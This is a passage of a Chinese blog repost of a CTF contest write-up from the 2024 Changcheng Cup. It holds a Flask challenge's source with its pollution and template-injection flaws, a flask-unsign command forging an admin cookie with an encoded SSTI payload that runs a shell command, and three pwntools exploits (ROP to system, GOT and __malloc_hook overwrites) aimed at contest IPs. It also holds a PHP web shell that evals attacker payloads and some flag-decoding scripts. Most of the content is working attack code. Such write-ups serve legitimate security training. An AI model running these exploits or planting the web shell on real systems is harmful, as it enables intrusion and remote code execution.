methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def view_candies():</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    identity = session.get(&#x27;identity&#x27;)</span><br><span class="line">    if not username or identity != &#x27;admin&#x27;:</span><br><span class="line">        return redirect(url_for(&#x27;register&#x27;))</span><br><span class="line">    return render_template(&#x27;admin.html&#x27;, view=&#x27;candies&#x27;, candies=candies)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin/add_candy&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def add_candy():</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    identity = session.get(&#x27;identity&#x27;)</span><br><span class="line">    if not username or identity != &#x27;admin&#x27;:</span><br><span class="line">        return redirect(url_for(&#x27;register&#x27;))</span><br><span class="line">    candy_name = request.form.get(&#x27;name&#x27;)</span><br><span class="line">    candy_image = request.form.get(&#x27;image&#x27;)</span><br><span class="line">    if candy_name and candy_image:</span><br><span class="line">        new_candy = Candy(name=candy_name, image=candy_image)</span><br><span class="line">        candies.append(new_candy)</span><br><span class="line">    return render_template(&#x27;admin.html&#x27;, view=&#x27;add_candy&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin/view_inventory&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def view_inventory():</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    identity = session.get(&#x27;identity&#x27;)</span><br><span class="line">    if not username or identity != &#x27;admin&#x27;:</span><br><span class="line">        return redirect(url_for(&#x27;register&#x27;))</span><br><span class="line">    inventory_value = sanitize_inventory_sold(inventory)</span><br><span class="line">    sold_value = sanitize_inventory_sold(sold)</span><br><span class="line">    return render_template_string(&quot;商店库存:&quot; + inventory_value + &quot;已售出&quot; + sold_value)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin/add_inventory&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def add_inventory():</span><br><span class="line">    global inventory</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    identity = session.get(&#x27;identity&#x27;)</span><br><span class="line">    if not username or identity != &#x27;admin&#x27;:</span><br><span class="line">        return redirect(url_for(&#x27;register&#x27;))</span><br><span class="line">    if request.form.get(&#x27;add&#x27;):</span><br><span class="line">        num = request.form.get(&#x27;add&#x27;)</span><br><span class="line">        inventory += int(num)</span><br><span class="line">    return render_template(&#x27;admin.html&#x27;, view=&#x27;add_inventory&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=False, host=&#x27;0.0.0.0&#x27;, port=1337)</span><br><span class="line"># 获取flag大致路径的</span><br><span class="line">if request.method == &#x27;POST&#x27;:</span><br><span class="line">        action = request.form.get(&#x27;action&#x27;)</span><br><span class="line">        if action == &quot;buy_candy&quot;:</span><br><span class="line">            if inventory &gt; 0:</span><br><span class="line">                inventory -= 3</span><br><span class="line">                sold += 3</span><br><span class="line">            if inventory == 0:</span><br><span class="line">                message = &quot;All candies are sold out!&quot;</span><br><span class="line">            if sold &gt;= 500:</span><br><span class="line">                with open(&#x27;secret.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">                    message = file.read()</span><br><span class="line"></span><br><span class="line"># 造成原型链污染处</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line">....</span><br><span class="line">admin = Admin()</span><br><span class="line">merge(session,admin)</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"># SSTI处</span><br><span class="line">def view_inventory():</span><br><span class="line">    username = session.get(&#x27;username&#x27;)</span><br><span class="line">    identity = session.get(&#x27;identity&#x27;)</span><br><span class="line">    if not username or identity != &#x27;admin&#x27;:</span><br><span class="line">        return redirect(url_for(&#x27;register&#x27;))</span><br><span class="line">    inventory_value = sanitize_inventory_sold(inventory)</span><br><span class="line">    sold_value = sanitize_inventory_sold(sold)</span><br><span class="line">    return render_template_string(&quot;商店库存:&quot; + inventory_value + &quot;已售出&quot; + sold_value)</span><br><span class="line"></span><br><span class="line"># SSTI Waf处</span><br><span class="line">def sanitize_inventory_sold(value):</span><br><span class="line">    return re.sub(r&#x27;[a-zA-Z_]&#x27;, &#x27;&#x27;, str(value))</span><br><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;identity&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;test3&#x27;,&#x27;__init__&#x27;:&#123;&#x27;__global</span><br><span class="line">s__&#x27;:&#123;&#x27;sold&#x27;:</span><br><span class="line">857,&#x27;inventory&#x27;:&#x27;&#123;&#123;&#x27;&#x27;[&#x27;\137\137\143\154\141\163\163\137\137&#x27;][&#x27;\137\137\142\141\163\145\163\137\137&#x27;][0][&#x27;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#x27;]()[133][&#x27;\137\137\151\156\151\164\137\137&#x27;][&#x27;\137\137\147\154\157\142\141\154\163\137\137&#x27;][&#x27;\137\137\142\165\151\154\164\151\156\163\137\137&#x27;][&#x27;\145\166\141\154&#x27;](&#x27;\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\160\157\160\145\156\050\042\167\150\157\141\155\151\042\051\056\162\145\141\144\050\051&#x27;)&#125;&#125;&#x27;&#125;&#125;&#125;&quot; --secret &#x27;a123456&#x27;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&quot;wt.exe&quot;,&quot;wsl&quot;]</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">p = elf.process()</span><br><span class="line">    #p = remote(&quot;8.147.131.74&quot;, 24077)</span><br><span class="line">def debug():</span><br><span class="line">    pause()</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    sleep(2)</span><br><span class="line"></span><br><span class="line">payload_1 = b&quot;A&quot; * (0x40 - 0xc) + b&quot;pwn&quot;  + b&quot;x00&quot; + p32(0xffffff)</span><br><span class="line">p.recvuntil(b&quot;:n&quot;)</span><br><span class="line">p.send(payload_1)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;:n&quot;,b&quot;a&quot;)</span><br><span class="line">p.sendlineafter(b&quot;:n&quot;,b&quot;a&quot;)</span><br><span class="line">p.sendlineafter(b&quot;1/0n&quot;,b&quot;1&quot;)</span><br><span class="line">p.sendlineafter(b&quot;:n&quot;,b&quot;a&quot;)</span><br><span class="line">p.sendlineafter(b&quot;1/0n&quot;,b&quot;1&quot;)</span><br><span class="line">    #debug()</span><br><span class="line">p.sendlineafter(b&quot;:n&quot;,b&quot;b&quot;)</span><br><span class="line">p.sendlineafter(b&quot;1/0n&quot;,b&quot;1&quot;)</span><br><span class="line">p.sendlineafter(b&quot;:n&quot;,b&quot;c&quot;)</span><br><span class="line"></span><br><span class="line">binsh = 0x601840</span><br><span class="line">system = elf.plt[&quot;system&quot;]</span><br><span class="line">pop_rdi = 0x0000000000400f13</span><br><span class="line"># : pop rdi ; ret</span><br><span class="line">ret = 0x00000000004006f6</span><br><span class="line">payload_1 = b&quot;A&quot; * 0x18 + p64(pop_rdi) + p64(binsh) + p64(ret)  + p64(system)</span><br><span class="line">p.sendlineafter(b&quot;1/0n&quot;,payload_1)</span><br><span class="line">p.interactive()</span><br><span class="line">from pwn import *</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&quot;wt.exe&quot;,&quot;wsl&quot;]</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">    #p = elf.process()</span><br><span class="line">p = remote(&quot;8.147.134.27&quot;,38474)</span><br><span class="line">    #libc = ELF(&quot;/home/kamome/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_i386/libc.so.6&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">def debug():</span><br><span class="line">    pause()</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    sleep(2)</span><br><span class="line"></span><br><span class="line">def add_heap(size,content):</span><br><span class="line">    p.sendlineafter(b&quot;5.exittn&quot;,b&#x27;&#123;&quot;choice&quot;:&quot;1&quot;,&quot;idx&quot;:0,&quot;size&quot;:&quot;&#x27; + bytes(str(size),encoding=&quot;utf-8&quot;) + b&#x27;&quot;,&quot;content&quot;:&quot;&#x27; + content + b&#x27;&quot;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">def free_heap(idx):</span><br><span class="line">    p.sendlineafter(b&quot;5.exittn&quot;,&#x27;&#123;&quot;choice&quot;:&quot;2&quot;,&quot;idx&quot;:&#x27; + str(idx) + &#x27;,&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;&quot;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">def show_heap(idx):</span><br><span class="line">    p.sendlineafter(b&quot;5.exittn&quot;,&#x27;&#123;&quot;choice&quot;:&quot;3&quot;,&quot;idx&quot;:&#x27; + str(idx) + &#x27;,&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;&quot;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">def edit_heap(idx,content):</span><br><span class="line">    p.sendlineafter(b&quot;5.exittn&quot;,b&#x27;&#123;&quot;choice&quot;:&quot;4&quot;,&quot;idx&quot;:1,&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;&#x27; + content + b&#x27;&quot;&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    #debug()</span><br><span class="line">    #pause()</span><br><span class="line"></span><br><span class="line">heaplist = 0x08051B10</span><br><span class="line">add_heap(8,b&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">    #free_got = elf.got[&quot;free&quot;]</span><br><span class="line">printf_got = elf.got[&quot;printf&quot;]</span><br><span class="line"></span><br><span class="line">payload_1 = b&quot;A&quot; * 0x4cc + p32(heaplist + 4)</span><br><span class="line">add_heap(printf_got,payload_1)</span><br><span class="line">    #add_heap(0x8,&quot;AAAA&quot;)</span><br><span class="line"></span><br><span class="line">show_heap(1)</span><br><span class="line">libc.address = u32(p.recvuntil(b&quot;xf7&quot;)[-4:]) - libc.sym[&quot;printf&quot;]</span><br><span class="line">log.success(&quot;libc.address = &quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">system = libc.sym[&quot;system&quot;]</span><br><span class="line"></span><br><span class="line">edit_heap(1,b&quot;A&quot; * 4 + p32(system))</span><br><span class="line"></span><br><span class="line">free_heap(0)</span><br><span class="line">    #debug()</span><br><span class="line">p.interactive()</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&quot;wt.exe&quot;,&quot;wsl&quot;]</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line">def get_p(file):</span><br><span class="line">    elf = ELF(file)</span><br><span class="line">    #p = elf.process()</span><br><span class="line">    p = remote(&quot;8.147.129.22&quot;,32449)</span><br><span class="line">    return p,elf</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    pause()</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    sleep(2)</span><br><span class="line"></span><br><span class="line">p,elf = get_p(&quot;./Heap&quot;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">def xxx():</span><br><span class="line">    p.sendlineafter()</span><br><span class="line">    p.sendlineafter()</span><br><span class="line">    p.sendlineafter()</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def add_heap(size,content):</span><br><span class="line">    p.sendlineafter(b&quot;adventurer? &quot;,b&quot;1&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;bytes): &quot;,str(size))</span><br><span class="line">    p.sendlineafter(b&quot;bytes):n&quot;,content)</span><br><span class="line"></span><br><span class="line">def free_heap(idx):</span><br><span class="line">    p.sendlineafter(b&quot;adventurer? &quot;,b&quot;2&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit_heap(idx,content):</span><br><span class="line">    p.sendlineafter(b&quot;adventurer? &quot;, b&quot;3&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;: &quot;,str(idx))</span><br><span class="line">    p.sendlineafter(b&quot;:n&quot;,content)</span><br><span class="line"></span><br><span class="line">def show_heap(idx):</span><br><span class="line">    p.sendlineafter(b&quot;adventurer? &quot;,b&quot;4&quot;)</span><br><span class="line">    p.sendlineafter(b&quot;: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">add_heap(0x440,b&quot;A&quot;)    #chunk 0</span><br><span class="line">add_heap(0x440,b&quot;A&quot;)    #chunk 1</span><br><span class="line"></span><br><span class="line">free_heap(0)</span><br><span class="line">show_heap(0)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(b&quot;x7f&quot;)[-6:].ljust(8,b&quot;x00&quot;)) - 0x1ebbe0</span><br><span class="line">log.success(&quot;libc =&quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc.sym[&quot;__malloc_hook&quot;]</span><br><span class="line"></span><br><span class="line">add_heap(0x10,b&quot;A&quot;)  #chunk 2</span><br><span class="line">add_heap(0x10,b&#x27;A&#x27;)  #chunk 3</span><br><span class="line"></span><br><span class="line">free_heap(2)</span><br><span class="line">free_heap(3)</span><br><span class="line"></span><br><span class="line">edit_heap(3,p64(malloc_hook))</span><br><span class="line"></span><br><span class="line">one_gadgets = [0xe6c7e,0xe6c81,0xe6c84]</span><br><span class="line">og = libc.address + one_gadgets[1]</span><br><span class="line"></span><br><span class="line">add_heap(0x10,b&quot;A&quot;)</span><br><span class="line">add_heap(0x10,p64(og))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&quot;adventurer? &quot;, b&quot;1&quot;)</span><br><span class="line">p.sendlineafter(b&quot;bytes): &quot;, b&quot;10&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line">&lt;?php</span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@error_reporting(0);</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">        $c = $K[$i+1&amp;15];</span><br><span class="line">        $D[$i] = $D[$i]^$c;</span><br><span class="line">    &#125;</span><br><span class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line">$pass=&#x27;25ming@&#x27;;</span><br><span class="line">$payloadName=&#x27;payload&#x27;;</span><br><span class="line">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class="line">if (isset($_POST[$pass]))&#123;</span><br><span class="line">    $data=encode(base64_decode($_POST[$pass]),$key);</span><br><span class="line">    if (isset($_SESSION[$payloadName]))&#123;</span><br><span class="line">        $payload=encode($_SESSION[$payloadName],$key);</span><br><span class="line">        eval($payload);</span><br><span class="line">        echo substr(md5($pass.$key),0,16);</span><br><span class="line">        echo base64_encode(encode(@run($data),$key));</span><br><span class="line">        echo substr(md5($pass.$key),16);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if (stripos($data,&quot;getBasicsInfo&quot;)!==false)&#123;</span><br><span class="line">            $_SESSION[$payloadName]=encode($data,$key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">8fa14cdd754f91cc6554c9e71929cce7</span><br><span class="line">2db95e8e1a9267b7a1188556b2013b33</span><br><span class="line">0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">b2f5ff47436671b6e533d8dc3614845d</span><br><span class="line">f95b70fdc3088560732a5ac135644506</span><br><span class="line">b9ece18c950afbfa6b0fdbfa4ff731d3</span><br><span class="line">2510c39011c5be704182423e3a695e91</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">6f8f57715090da2632453988d9a1501b</span><br><span class="line">cfcd208495d565ef66e7dff9f98764da</span><br><span class="line">03c7c0ace395d80182db07ae2c30f034</span><br><span class="line">e358efa489f58062f10dd7316b65649e</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">c81e728d9d4c2f636f067f89cc14862c</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">4a8a08f09d37b73795649038408b5f33</span><br><span class="line">4c614360da93c0a041b22e537de151eb</span><br><span class="line">4b43b0aee35624cd95b910189b3dc231</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">8d9c307cb7f3c4a32822a51922d1ceaa</span><br><span class="line">4a8a08f09d37b73795649038408b5f33</span><br><span class="line">4b43b0aee35624cd95b910189b3dc231</span><br><span class="line">57cec4137b614c87cb4e24a3d003a3e0</span><br><span class="line">83878c91171338902e0fe0fb97a8c47a</span><br><span class="line">e358efa489f58062f10dd7316b65649e</span><br><span class="line">865c0c0b4ab0e063e5caa3387c1a8741</span><br><span class="line">d95679752134a2d9eb61dbd7b91c4bcc</span><br><span class="line">7b8b965ad4bca0e41ab51de7b31363a1</span><br><span class="line">9033e0e305f247c0c3c80d0c7848c8b3</span><br><span class="line">9033e0e305f247c0c3c80d0c7848c8b3</span><br><span class="line">9033e0e305f247c0c3c80d0c7848c8b3</span><br><span class="line">cbb184dd8e05c9709e5dcaedaa0495cf</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line">    &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;,</span><br><span class="line">    &#x27;2db95e8e1a9267b7a1188556b2013b33&#x27;,</span><br><span class="line">    &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;,</span><br><span class="line">    &#x27;b2f5ff47436671b6e533d8dc3614845d&#x27;,</span><br><span class="line">    &#x27;f95b70fdc3088560732a5ac135644506&#x27;,</span><br><span class="line">    &#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;,</span><br><span class="line">    &#x27;2510c39011c5be704182423e3a695e91&#x27;,</span><br><span class="line">    &#x27;e1671797c52e15f763380b45e841ec32&#x27;,</span><br><span class="line">    &#x27;b14a7b8059d9c055954c92674ce60032&#x27;,</span><br><span class="line">    &#x27;6f8f57715090da2632453988d9a1501b&#x27;,</span><br><span class="line">    &#x27;cfcd208495d565ef66e7dff9f98764da&#x27;,</span><br><span class="line">    &#x27;03c7c0ace395d80182db07ae2c30f034&#x27;,</span><br><span class="line">    &#x27;e358efa489f58062f10dd7316b65649e&#x27;,</span><br><span class="line">    &#x27;b14a7b8059d9c055954c92674ce60032&#x27;,</span><br><span class="line">    &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;,</span><br><span class="line">    &#x27;e1671797c52e15f763380b45e841ec32&#x27;,</span><br><span class="line">    &#x27;4a8a08f09d37b73795649038408b5f33&#x27;,</span><br><span class="line">    &#x27;4c614360da93c0a041b22e537de151eb&#x27;,</span><br><span class="line">    &#x27;4b43b0aee35624cd95b910189b3dc231&#x27;,</span><br><span class="line">    &#x27;e1671797c52e15f763380b45e841ec32&#x27;,</span><br><span class="line">    &#x27;b14a7b8059d9c055954c92674ce60032&#x27;,</span><br><span class="line">    &#x27;e1671797c52e15f763380b45e841ec32&#x27;,</span><br><span class="line">    &#x27;8d9c307cb7f3c4a32822a51922d1ceaa&#x27;,</span><br><span class="line">    &#x27;4a8a08f09d37b73795649038408b5f33&#x27;,</span><br><span class="line">    &#x27;4b43b0aee35624cd95b910189b3dc231&#x27;,</span><br><span class="line">    &#x27;57cec4137b614c87cb4e24a3d003a3e0&#x27;,</span><br><span class="line">    &#x27;83878c91171338902e0fe0fb97a8c47a&#x27;,</span><br><span class="line">    &#x27;e358efa489f58062f10dd7316b65649e&#x27;,</span><br><span class="line">    &#x27;865c0c0b4ab0e063e5caa3387c1a8741&#x27;,</span><br><span class="line">    &#x27;d95679752134a2d9eb61dbd7b91c4bcc&#x27;,</span><br><span class="line">    &#x27;7b8b965ad4bca0e41ab51de7b31363a1&#x27;,</span><br><span class="line">    &#x27;9033e0e305f247c0c3c80d0c7848c8b3&#x27;,</span><br><span class="line">    &#x27;9033e0e305f247c0c3c80d0c7848c8b3&#x27;,</span><br><span class="line">    &#x27;9033e0e305f247c0c3c80d0c7848c8b3&#x27;,</span><br><span class="line">    &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">alphabet = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line">for x in range(len(flag)):</span><br><span class="line">    for i in alphabet:</span><br><span class="line">        en = hashlib.md5(i.encode()).hexdigest()</span><br><span class="line">        if en == flag[x]:</span><br><span class="line">            print(i, end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line"># flag&#123;The_m0st_2ecUre_eNcrYption!!!&#125;</span><br><span class="line">true_flag = [</span><br><span class="line">    0x00, 0x1B, 0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, </span><br><span class="line">    0x51, 0x4B, 0x4F, 0x57, 0x05, 0x54, 0x0A, 0x0D, 0x06, 0x1C, </span><br><span class="line">    0x1D, 0x05, 0x05, 0x5F, 0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, </span><br><span class="line">    0x05, 0x57, 0x0A, 0x0D, 0x06, 0x1C, 0x1D, 0x05, 0x05, 0x5F, </span><br><span class="line">    0x0D, 0x03, 0x04, 0x0A, 0x14, 0x49, 0x05, 0x57, 0x00, 0x1B, </span><br><span class="line">    0x19, 0x02, 0x01, 0x54, 0x4E, 0x4C, 0x56, 0x00, 0x51, 0x4B, </span><br><span class="line">    0x4F, 0x57, 0x05, 0x54, 0x55, 0x03, 0x53, 0x57, 0x01, 0x03, </span><br><span class="line">    0x07, 0x04, 0x4A, 0x77, 0x0D</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">tmp = &#x27;f&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">    next1 = true_flag[16 + i] ^ ord(tmp[-1])</span><br><span class="line">    tmp += chr(next1)</span><br><span class="line"></span><br><span class="line">print(tmp)</span><br><span class="line">for i in range(16):</span><br><span class="line">    next1 = true_flag[i] ^ ord(tmp[-1])</span><br><span class="line">    tmp += chr(next1)</span><br><span class="line">print(tmp)</span><br><span class="line">for x in range(33, len(true_flag)):</span><br><span class="line">    tmp = &#x27;flag&#123;fcf94739-da66-467c-a77f-b50d&#x27;</span><br><span class="line">    for i in range(10):</span><br><span class="line">        next1 = true_flag[x + i] ^ ord(tmp[-1])</span><br><span class="line">        tmp += chr(next1)</span><br><span class="line">    print(tmp)</span><br><span class="line"></span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50diosnkn1&lt;?;</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50db~cfc&lt;126&lt;</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dxe`e:</span><br><span class="line">740:.</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dy|y&amp;+(,&amp;2&#123;</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dad;651;/fc</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50da&gt;304&gt;*cf1</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d;651;/fc44</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dijndp9&lt;kkp</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dgci&#125;41ff&#125;d</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d`j~72ee~ge</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dnz36aazca`</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dp9&lt;kkpikj&gt;</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d-(d&#125;~*d</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50da66-467c-a</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d33(132f(d2</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50ddfde13ee</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dfde13ee4</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d&#125;~*d(~~/d</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dfg3&#125;1gg6&#125;2</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50de13ee40g</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d0~2dd5~1fc</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d*f00a*e27c</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d(~~/d+|y-x</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d22c(g05a47</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50dd5~1fc7ba2</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d5~1fc7ba2e</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d/`72f30c45</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d+|y-x&#123;(~&#125;</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d36b74g0125</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50da5`c0gfebf</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d0ef5bc`gc)</span><br><span class="line"># flag&#123;fcf94739-da66-467c-a77f-b50d12a67437&#125;</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/204463.html](https://www.ctfiot.com/204463.html)
+> 仓库原文：[CTF大赛WP集合/articles/2024年第四届“长城杯”网络安全大赛_暨京津冀网络安全技能竞赛（初赛）Writeup.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2024%E5%B9%B4%E7%AC%AC%E5%9B%9B%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89Writeup.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL-%E9%80%9A%E9%85%8D%E7%AC%A6%E7%99%BB%E5%BD%95/">SQL 通配符登录 %%</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Web/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%98%E8%B5%9B-%E5%88%9D%E8%B5%9BWrite_up/" title="2024 巅峰极客挑战赛-初赛 Write_up"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2024 巅峰极客挑战赛-初赛 Write_up</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Web/2024%E6%95%B0%E4%BF%A1%E6%9D%AF%E8%A5%BF%E5%8C%BA%E9%A2%98%E8%A7%A3/" title="2024 数信杯西区题解（安全加固+应急响应+SQL 盲注+凯撒）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024 数信杯西区题解（安全加固+应急响应+SQL 盲注+凯撒）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a 